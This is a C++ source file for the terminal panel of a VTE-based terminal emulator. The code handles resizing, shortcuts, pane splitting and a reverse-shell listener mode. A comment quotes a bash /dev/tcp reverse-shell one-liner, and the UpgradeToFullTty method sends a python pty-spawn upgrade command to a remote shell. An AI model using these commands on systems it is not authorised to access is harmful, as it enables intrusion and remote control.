#include "TerminalPanel.h"
#include "TerminalSettings.h"

#include <wx/aui/auibook.h>
#include <wx/splitter.h>

#include <gtk/gtk.h>
#include <vte/vte.h>

#include <termios.h>
#include <unistd.h>

#include <utility>
#include <vector>

namespace
{
    // Translates the small set of non-printable wx key codes a shortcut is
    // realistically assigned to into their GDK equivalent, so a GTK-level
    // key-press-event (see the "key-press-event" handler below) can be
    // compared against a TerminalSettings shortcut captured via ShortcutPicker
    // (which records it in wx's domain). Printable ASCII (letters, digits,
    // punctuation, space) needs no translation — wx and GDK agree on those.
    guint WxKeyCodeToGdkKeyval(int wxKeyCode)
    {
        switch (wxKeyCode)
        {
            case WXK_TAB: return GDK_KEY_Tab;
            case WXK_RETURN: return GDK_KEY_Return;
            case WXK_ESCAPE: return GDK_KEY_Escape;
            case WXK_SPACE: return GDK_KEY_space;
            case WXK_BACK: return GDK_KEY_BackSpace;
            case WXK_DELETE: return GDK_KEY_Delete;
            case WXK_INSERT: return GDK_KEY_Insert;
            case WXK_HOME: return GDK_KEY_Home;
            case WXK_END: return GDK_KEY_End;
            case WXK_PAGEUP: return GDK_KEY_Page_Up;
            case WXK_PAGEDOWN: return GDK_KEY_Page_Down;
            case WXK_LEFT: return GDK_KEY_Left;
            case WXK_RIGHT: return GDK_KEY_Right;
            case WXK_UP: return GDK_KEY_Up;
            case WXK_DOWN: return GDK_KEY_Down;
            case WXK_F1: return GDK_KEY_F1;
            case WXK_F2: return GDK_KEY_F2;
            case WXK_F3: return GDK_KEY_F3;
            case WXK_F4: return GDK_KEY_F4;
            case WXK_F5: return GDK_KEY_F5;
            case WXK_F6: return GDK_KEY_F6;
            case WXK_F7: return GDK_KEY_F7;
            case WXK_F8: return GDK_KEY_F8;
            case WXK_F9: return GDK_KEY_F9;
            case WXK_F10: return GDK_KEY_F10;
            case WXK_F11: return GDK_KEY_F11;
            case WXK_F12: return GDK_KEY_F12;
            default: return static_cast<guint>(wxKeyCode);
        }
    }

    bool MatchesShortcut(GdkEventKey* event, int accelFlags, int accelKeyCode)
    {
        guint expectedModifiers = 0;
        if (accelFlags & wxACCEL_CTRL) expectedModifiers |= GDK_CONTROL_MASK;
        if (accelFlags & wxACCEL_SHIFT) expectedModifiers |= GDK_SHIFT_MASK;
        if (accelFlags & wxACCEL_ALT) expectedModifiers |= GDK_MOD1_MASK;

        const guint modifiers = event->state & gtk_accelerator_get_default_mod_mask();
        if (modifiers != expectedModifiers)
            return false;

        // Letter shortcuts are captured/stored as uppercase (wx's convention
        // for KeyDown events), but GDK reports the lowercase keyval whenever
        // Shift isn't held — normalize both sides before comparing.
        return gdk_keyval_to_upper(event->keyval) ==
               gdk_keyval_to_upper(WxKeyCodeToGdkKeyval(accelKeyCode));
    }
}

TerminalPanel::TerminalPanel(wxWindow* parent, const wxArrayString& argv, TerminalKind kind)
    : wxPanel(parent, wxID_ANY), m_kind(kind), m_argv(argv)
{
    m_vte = vte_terminal_new();

    vte_terminal_set_scrollback_lines(VTE_TERMINAL(m_vte), -1);
    vte_terminal_set_cursor_blink_mode(VTE_TERMINAL(m_vte), VTE_CURSOR_BLINK_SYSTEM);
    vte_terminal_set_mouse_autohide(VTE_TERMINAL(m_vte), TRUE);
    vte_terminal_set_scroll_on_output(VTE_TERMINAL(m_vte), FALSE);
    vte_terminal_set_scroll_on_keystroke(VTE_TERMINAL(m_vte), TRUE);

    auto* container = reinterpret_cast<GtkWidget*>(GetHandle());
    m_container = container;

    // Wrapping VTE in a GtkScrolledWindow gets us a real scrollbar for free:
    // VTE implements GtkScrollable, so gtk_container_add() here uses its own
    // adjustments directly (no intermediate GtkViewport), and the scrolled
    // window handles laying out VTE + the scrollbar together on its own —
    // whether the scrollbar is actually shown is toggled purely via its
    // policy (see ApplySettings), no extra layout work needed from us.
    m_scrolledWindow = gtk_scrolled_window_new(nullptr, nullptr);
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(m_scrolledWindow),
                                    GTK_POLICY_NEVER, GTK_POLICY_NEVER);
    gtk_container_add(GTK_CONTAINER(m_scrolledWindow), m_vte);
    gtk_widget_show(m_vte);

    // wxPizza (wx's internal GtkFixed) only tracks children added through its
    // own child-registration path. A plain gtk_container_add() bypasses that,
    // so wxPizza doesn't recognize the scrolled window as a real child and
    // falls back to a literal 1x1 default allocation on every layout pass —
    // which forces VTE down to a single row/column and genuinely discards
    // scrollback content (confirmed by directly inspecting VTE's buffer
    // before/after). Using gtk_fixed_put — the same registration GtkFixed's
    // own gtk_container_add does internally — records its geometry properly,
    // so layout passes leave it at its last real size instead of collapsing.
    gtk_fixed_put(GTK_FIXED(container), m_scrolledWindow, 0, 0);
    gtk_widget_show(m_scrolledWindow);

    // GtkFixed (now that the scrolled window is a registered child) still
    // doesn't resize children to fill the container on its own — it just
    // keeps them at their last explicit allocation. So we still need to
    // actively resize it to match on every layout pass, via the container's
    // own GTK "size-allocate" signal; stopping emission afterward skips
    // GtkFixed's now-redundant default re-allocation of the same, unchanged
    // geometry.
    //
    // A live sash drag fires this signal continuously — applying every
    // single intermediate size immediately resizes the pty (SIGWINCH) just
    // as often, and a prompt that redraws itself on resize (starship,
    // powerlevel10k, ...) can't keep up: each redraw lands at a different
    // width before the previous one finished, leaving overlapping partial
    // redraws on screen. Debounce with a short idle window so only the
    // settled, final size of a burst actually reaches VTE/the pty.
    g_signal_connect(container, "size-allocate",
        G_CALLBACK(+[](GtkWidget* self, GdkRectangle* allocation, gpointer data) {
            auto* panel = static_cast<TerminalPanel*>(data);
            panel->m_pendingWidth = allocation->width;
            panel->m_pendingHeight = allocation->height;

            if (panel->m_resizeSourceId == 0)
            {
                panel->m_resizeSourceId = g_timeout_add(30, +[](gpointer d) -> gboolean {
                    auto* p = static_cast<TerminalPanel*>(d);
                    p->m_resizeSourceId = 0;
                    p->AllocateVteToFill(p->m_pendingWidth, p->m_pendingHeight);
                    return G_SOURCE_REMOVE;
                }, panel);
            }

            g_signal_stop_emission_by_name(self, "size-allocate");
        }),
        this);

    gchar* shellPath = nullptr;
    std::vector<wxScopedCharBuffer> argBuffers;
    std::vector<gchar*> spawnArgv;

    if (argv.IsEmpty())
    {
        shellPath = vte_get_user_shell();
        if (!shellPath || !*shellPath)
            shellPath = g_strdup("/bin/sh");
        spawnArgv.push_back(shellPath);
    }
    else
    {
        argBuffers.reserve(argv.GetCount());
        for (const wxString& arg : argv)
            argBuffers.push_back(arg.ToUTF8());
        for (auto& buf : argBuffers)
            spawnArgv.push_back(const_cast<gchar*>(buf.data()));
    }
    spawnArgv.push_back(nullptr);

    // VTE emulates the xterm-256color control set, so tell the child shell
    // exactly that instead of inheriting whatever TERM this process has.
    gchar** envp = g_get_environ();
    envp = g_environ_setenv(envp, "TERM", "xterm-256color", TRUE);

    vte_terminal_spawn_async(
        VTE_TERMINAL(m_vte),
        VTE_PTY_DEFAULT,
        nullptr, // working directory: inherit termx's cwd
        spawnArgv.data(),
        envp,
        G_SPAWN_SEARCH_PATH,
        nullptr, nullptr, nullptr, // child setup callback + data + destroy notify
        -1,                        // default timeout
        nullptr,                   // cancellable
        [](VteTerminal*, GPid, GError* error, gpointer) {
            if (error)
                g_warning("termx: failed to spawn command: %s", error->message);
        },
        nullptr);

    g_strfreev(envp);
    g_free(shellPath);

    // Close this pane (or the whole tab, if it was never split) once its
    // spawned process exits — a local shell exiting, an SSH/SFTP/FTP client
    // disconnecting, or a reverse-shell listener going away should all take
    // the tab with them rather than leaving a dead terminal sitting open.
    // Deferred via CallAfter: this fires from inside VTE's own child-reaping
    // machinery, and destroying widgets (possibly this one) synchronously
    // from within that callback would be reentering it mid-signal.
    g_signal_connect(m_vte, "child-exited",
        G_CALLBACK(+[](VteTerminal*, gint, gpointer data) {
            auto* panel = static_cast<TerminalPanel*>(data);
            panel->CallAfter([panel]() { panel->ClosePane(); });
        }),
        this);

    // VTE is a foreign GtkWidget inserted directly into wx's container, so
    // mouse clicks on it never reach wx's own event pipeline — hook its GTK
    // button-press signal directly to catch right-clicks for the context menu.
    gtk_widget_add_events(m_vte, GDK_BUTTON_PRESS_MASK);
    g_signal_connect(m_vte, "button-press-event",
        G_CALLBACK(+[](GtkWidget*, GdkEventButton* event, gpointer data) -> gboolean {
            if (event->type == GDK_BUTTON_PRESS && event->button == 3)
            {
                static_cast<TerminalPanel*>(data)->ShowContextMenu(
                    wxPoint(static_cast<int>(event->x), static_cast<int>(event->y)));
                return TRUE;
            }
            return FALSE;
        }),
        this);

    // Plain Ctrl+C is left entirely alone — it's VTE's own shortcut for
    // sending SIGINT (^C) to the child process. Copy/paste instead use
    // Ctrl+Shift+C/V, neither of which has a default meaning to VTE.
    g_signal_connect(m_vte, "key-press-event",
        G_CALLBACK(+[](GtkWidget*, GdkEventKey* event, gpointer data) -> gboolean {
            auto* panel = static_cast<TerminalPanel*>(data);
            const guint modifiers = event->state & gtk_accelerator_get_default_mod_mask();
            if (modifiers != (GDK_CONTROL_MASK | GDK_SHIFT_MASK))
                return FALSE;

            if (event->keyval == GDK_KEY_c || event->keyval == GDK_KEY_C)
            {
                panel->CopySelection();
                return TRUE;
            }

            if (event->keyval == GDK_KEY_v || event->keyval == GDK_KEY_V)
            {
                panel->PasteFromClipboard();
                return TRUE;
            }

            return FALSE;
        }),
        this);

    // MainFrame's wxAcceleratorTable only ever sees key events that reach
    // wx's own event loop — VTE is a foreign GtkWidget whose default
    // key-press-event handler swallows essentially every keystroke as
    // terminal input first, so the configurable next/previous-tab shortcuts
    // need the same direct-intercept treatment as copy/paste above. Matched
    // presses are re-fired as a wxEVT_MENU at the top-level frame, the same
    // event the accelerator table itself would have generated.
    g_signal_connect(m_vte, "key-press-event",
        G_CALLBACK(+[](GtkWidget*, GdkEventKey* event, gpointer data) -> gboolean {
            auto* panel = static_cast<TerminalPanel*>(data);
            const TerminalSettings& settings = panel->m_settings;

            wxWindowID commandId = wxID_ANY;
            if (MatchesShortcut(event, settings.nextTabAccelFlags, settings.nextTabAccelKeyCode))
                commandId = kNextTabCommandId;
            else if (MatchesShortcut(event, settings.prevTabAccelFlags, settings.prevTabAccelKeyCode))
                commandId = kPreviousTabCommandId;
            else
                return FALSE;

            if (wxWindow* top = wxGetTopLevelParent(panel))
            {
                wxCommandEvent commandEvent(wxEVT_MENU, commandId);
                top->GetEventHandler()->ProcessEvent(commandEvent);
            }
            return TRUE;
        }),
        this);

    Bind(wxEVT_SET_FOCUS, &TerminalPanel::OnSetFocus, this);

    CallAfter([this]() {
        if (m_vte)
            gtk_widget_grab_focus(m_vte);
    });

    ApplySettings(m_settings);
}

TerminalPanel::~TerminalPanel()
{
    // Destroying the VTE widget tears down its PTY, which delivers SIGHUP to
    // the child shell — no manual process cleanup needed here.

    // A debounced resize (see the "size-allocate" hook) may still be
    // pending; left alone it would fire after this object is gone.
    if (m_resizeSourceId != 0)
        g_source_remove(m_resizeSourceId);
}

void TerminalPanel::AllocateVteToFill(int width, int height)
{
    if (!m_scrolledWindow)
        return;

    // The scrolled window handles laying out VTE and its own scrollbar
    // within whatever area it's given, so we only need to size the scrolled
    // window itself here — not VTE directly.
    GtkAllocation alloc;
    alloc.x = 0;
    alloc.y = 0;
    alloc.width = width > 0 ? width : 1;
    alloc.height = height > 0 ? height : 1;

    gtk_widget_set_size_request(m_scrolledWindow, alloc.width, alloc.height);
    gtk_widget_size_allocate(m_scrolledWindow, &alloc);

    // If VTE just shrank (e.g. mid sash-drag), the area it no longer covers
    // was never told to redraw — GTK only repaints the region a widget's
    // OWN size-allocate call actually touches, not whatever the container
    // used to show there. Left alone, that strip keeps showing whatever was
    // rendered at the previous, wider allocation (stale prompt lines etc.).
    // Invalidating the whole container forces it to repaint properly.
    if (m_container)
        gtk_widget_queue_draw(m_container);
}

void TerminalPanel::OnSetFocus(wxFocusEvent& event)
{
    if (m_vte)
        gtk_widget_grab_focus(m_vte);

    event.Skip();
}

void TerminalPanel::ApplySettings(const TerminalSettings& settings)
{
    m_settings = settings;

    if (!m_vte)
        return;

    const wxScopedCharBuffer family = settings.fontFamily.ToUTF8();
    PangoFontDescription* fontDesc = pango_font_description_new();
    pango_font_description_set_family(fontDesc, family.data());
    pango_font_description_set_size(fontDesc, settings.fontSize * PANGO_SCALE);
    vte_terminal_set_font(VTE_TERMINAL(m_vte), fontDesc);
    pango_font_description_free(fontDesc);

    vte_terminal_set_cell_height_scale(VTE_TERMINAL(m_vte), settings.lineSpacing);

    const double opacity = settings.opacityPercent / 100.0;

    GdkRGBA fg;
    fg.red = settings.foregroundColor.Red() / 255.0;
    fg.green = settings.foregroundColor.Green() / 255.0;
    fg.blue = settings.foregroundColor.Blue() / 255.0;
    fg.alpha = 1.0;

    GdkRGBA bg;
    bg.red = settings.backgroundColor.Red() / 255.0;
    bg.green = settings.backgroundColor.Green() / 255.0;
    bg.blue = settings.backgroundColor.Blue() / 255.0;
    bg.alpha = opacity;

    vte_terminal_set_colors(VTE_TERMINAL(m_vte), &fg, &bg, nullptr, 0);

    if (m_scrolledWindow)
    {
        const GtkPolicyType verticalPolicy =
            settings.showTerminalScrollbar ? GTK_POLICY_ALWAYS : GTK_POLICY_NEVER;
        gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(m_scrolledWindow),
                                        GTK_POLICY_NEVER, verticalPolicy);
    }
}

void TerminalPanel::UpgradeToFullTty()
{
    if (m_kind != TerminalKind::ReverseShell || !m_vte)
        return;

    // Standard "PTY upgrade" technique: a raw reverse shell (e.g. from
    // `bash -i >& /dev/tcp/host/port 0>&1`) has no real remote pty, so no job
    // control, signal handling, tab completion, or line editing. Re-exec'ing
    // the shell under a Python-allocated pty on the target fixes that. Tries
    // python3, then python2, then `script` as a fallback with no Python at
    // all. vte_terminal_feed_child sends these bytes to the spawned nc's
    // stdin exactly as if typed, which nc forwards over the raw socket.
    static const char* kUpgradeCommand =
        "(command -v python3 >/dev/null 2>&1 && exec python3 -c 'import pty; pty.spawn(\"/bin/bash\")') "
        "|| (command -v python >/dev/null 2>&1 && exec python -c 'import pty; pty.spawn(\"/bin/bash\")') "
        "|| (command -v script >/dev/null 2>&1 && exec script -qc /bin/bash /dev/null) "
        "|| echo 'termx: no PTY upgrade method found on target'\n";

    vte_terminal_feed_child(VTE_TERMINAL(m_vte), kUpgradeCommand, -1);

    // Now that the remote pty will echo/line-edit its own input, stop the
    // *local* pty from also doing so, or every keystroke would show twice.
    // Empirically confirmed on Linux: tcsetattr on a pty's master fd (what
    // VTE exposes) does update the shared line discipline, no need to open
    // the /dev/pts/N slave separately.
    if (VtePty* pty = vte_terminal_get_pty(VTE_TERMINAL(m_vte)))
    {
        const int fd = vte_pty_get_fd(pty);
        struct termios attrs;
        if (tcgetattr(fd, &attrs) == 0)
        {
            attrs.c_lflag &= ~(ECHO | ICANON);
            tcsetattr(fd, TCSANOW, &attrs);
        }
    }

    // Give the remote a moment to land on the new pty-backed shell prompt
    // before sending follow-up commands, then match its TERM and window size
    // to this terminal's. The widget is ref'd across the delay so closing
    // this tab in the meantime can't leave a dangling pointer here.
    const glong rows = vte_terminal_get_row_count(VTE_TERMINAL(m_vte));
    const glong cols = vte_terminal_get_column_count(VTE_TERMINAL(m_vte));

    g_object_ref(m_vte);
    auto* args = new std::pair<GtkWidget*, wxString>(
        m_vte, wxString::Format("export TERM=xterm-256color; stty rows %ld columns %ld\n",
                                 rows, cols));

    g_timeout_add(700, [](gpointer data) -> gboolean {
        auto* pair = static_cast<std::pair<GtkWidget*, wxString>*>(data);
        const wxScopedCharBuffer utf8 = pair->second.ToUTF8();
        vte_terminal_feed_child(VTE_TERMINAL(pair->first), utf8.data(),
                                 static_cast<gssize>(utf8.length()));
        g_object_unref(pair->first);
        delete pair;
        return G_SOURCE_REMOVE;
    }, args);
}

void TerminalPanel::CopySelection()
{
    if (m_vte)
        vte_terminal_copy_clipboard_format(VTE_TERMINAL(m_vte), VTE_FORMAT_TEXT);
}

void TerminalPanel::PasteFromClipboard()
{
    if (m_vte)
        vte_terminal_paste_clipboard(VTE_TERMINAL(m_vte));
}

void TerminalPanel::ShowContextMenu(const wxPoint& pos)
{
    wxMenu menu;

    wxMenuItem* copyItem = menu.Append(wxID_ANY, "Copy");
    copyItem->Enable(m_vte && vte_terminal_get_has_selection(VTE_TERMINAL(m_vte)));
    menu.Bind(wxEVT_MENU, [this](wxCommandEvent&) { CopySelection(); }, copyItem->GetId());

    wxMenuItem* pasteItem = menu.Append(wxID_ANY, "Paste");
    menu.Bind(wxEVT_MENU, [this](wxCommandEvent&) { PasteFromClipboard(); }, pasteItem->GetId());

    wxMenuItem* selectAllItem = menu.Append(wxID_ANY, "Select All");
    menu.Bind(wxEVT_MENU, [this](wxCommandEvent&) {
        if (m_vte)
            vte_terminal_select_all(VTE_TERMINAL(m_vte));
    }, selectAllItem->GetId());

    menu.AppendSeparator();

    wxMenuItem* splitVerticalItem = menu.Append(wxID_ANY, "Split Vertically");
    menu.Bind(wxEVT_MENU, [this](wxCommandEvent&) { SplitPane(true); }, splitVerticalItem->GetId());

    wxMenuItem* splitHorizontalItem = menu.Append(wxID_ANY, "Split Horizontally");
    menu.Bind(wxEVT_MENU, [this](wxCommandEvent&) { SplitPane(false); }, splitHorizontalItem->GetId());

    PopupMenu(&menu, pos);
}

void TerminalPanel::SplitPane(bool vertical)
{
    wxWindow* parent = GetParent();

    // Splitting replaces this panel's slot — a notebook page, or one side of
    // an already-split pane — with a new wxSplitterWindow holding this panel
    // and a freshly spawned clone of the same session (same argv/kind, so an
    // SSH split reconnects to the same remote host).
    if (auto* notebook = dynamic_cast<wxAuiNotebook*>(parent))
    {
        const int pageIndex = notebook->GetPageIndex(this);
        if (pageIndex == wxNOT_FOUND)
            return;

        const wxString label = notebook->GetPageText(pageIndex);
        const bool wasSelected = notebook->GetSelection() == pageIndex;

        // RemovePage must run while this panel is still the notebook's
        // actual registered child — reparenting it away first leaves the
        // notebook's internal bookkeeping pointing at a page whose window it
        // no longer owns, which renders as an empty page.
        notebook->RemovePage(pageIndex);

        auto* splitter = new wxSplitterWindow(notebook, wxID_ANY, wxDefaultPosition,
                                              wxDefaultSize, wxSP_LIVE_UPDATE);
        splitter->SetMinimumPaneSize(50);

        Reparent(splitter);
        auto* clone = new TerminalPanel(splitter, m_argv, m_kind);
        clone->ApplySettings(m_settings);

        if (vertical)
            splitter->SplitVertically(this, clone);
        else
            splitter->SplitHorizontally(this, clone);

        notebook->InsertPage(pageIndex, splitter, label, wasSelected);
    }
    else if (auto* parentSplitter = dynamic_cast<wxSplitterWindow*>(parent))
    {
        auto* splitter = new wxSplitterWindow(parentSplitter, wxID_ANY, wxDefaultPosition,
                                              wxDefaultSize, wxSP_LIVE_UPDATE);
        splitter->SetMinimumPaneSize(50);

        Reparent(splitter);
        auto* clone = new TerminalPanel(splitter, m_argv, m_kind);
        clone->ApplySettings(m_settings);

        if (vertical)
            splitter->SplitVertically(this, clone);
        else
            splitter->SplitHorizontally(this, clone);

        parentSplitter->ReplaceWindow(this, splitter);
    }
}

void TerminalPanel::ClosePane()
{
    wxWindow* parent = GetParent();

    // Never split — this panel is a whole tab. Close the tab outright.
    if (auto* notebook = dynamic_cast<wxAuiNotebook*>(parent))
    {
        const int pageIndex = notebook->GetPageIndex(this);
        if (pageIndex != wxNOT_FOUND)
            notebook->DeletePage(static_cast<size_t>(pageIndex)); // destroys this
        return;
    }

    // One side of a split — collapse the split instead of closing the whole
    // tab, mirroring SplitPane()'s own notebook/splitter-parent split in
    // reverse: give the surviving sibling this panel's former slot, then
    // discard the now-empty splitter (which takes this panel down with it,
    // since Unsplit() only detaches it from layout, not from the splitter
    // as its wx parent).
    if (auto* splitter = dynamic_cast<wxSplitterWindow*>(parent))
    {
        wxWindow* sibling = (splitter->GetWindow1() == this) ? splitter->GetWindow2()
                                                              : splitter->GetWindow1();
        if (!sibling)
        {
            Destroy();
            return;
        }

        splitter->Unsplit(this);

        wxWindow* grandParent = splitter->GetParent();
        if (auto* parentNotebook = dynamic_cast<wxAuiNotebook*>(grandParent))
        {
            const int pageIndex = parentNotebook->GetPageIndex(splitter);
            if (pageIndex != wxNOT_FOUND)
            {
                const wxString label = parentNotebook->GetPageText(pageIndex);
                const bool wasSelected = parentNotebook->GetSelection() == pageIndex;

                parentNotebook->RemovePage(pageIndex);
                sibling->Reparent(parentNotebook);
                parentNotebook->InsertPage(pageIndex, sibling, label, wasSelected);
            }
        }
        else if (auto* grandSplitter = dynamic_cast<wxSplitterWindow*>(grandParent))
        {
            sibling->Reparent(grandSplitter);
            grandSplitter->ReplaceWindow(splitter, sibling);
        }

        splitter->Destroy();
    }
}
